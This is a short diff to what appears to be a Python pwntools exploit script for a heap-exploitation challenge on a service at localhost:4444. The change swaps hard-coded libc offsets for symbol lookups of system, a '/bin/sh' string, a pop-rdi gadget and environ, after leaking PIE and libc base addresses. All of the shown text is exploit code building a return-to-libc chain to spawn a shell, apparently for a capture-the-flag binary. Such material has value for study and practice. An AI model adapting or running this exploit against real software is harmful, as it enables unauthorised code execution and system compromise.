@@ -29,6 +29,8 @@ def delete(i):
 def salir():
 	menu(5)
 
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+
 r = remote("localhost", 4444)
 
 pie = int(r.recv(12), 16) + 0x20
@@ -52,10 +54,10 @@ base_libc = u64(ver(0).ljust(8, '\0')) - 0x3c4b78
 print "[+] base libc: 0x%x" % base_libc
 delete(1)
 
-p_system = base_libc + 0x45390
-p_bin_sh = base_libc + 0x18cd17
-pop_rdi = base_libc + 0x21102
-environ = base_libc + 0x3c6f38
+p_system = base_libc + libc.symbols['system']
+p_bin_sh = base_libc + next(libc.search("/bin/sh\0"))
+pop_rdi = base_libc + next(libc.search("\x5f\xc3"))
+environ = base_libc + libc.symbols['environ']
 
 add(0, 0x58, "")
 add(1, 0xf8, "")
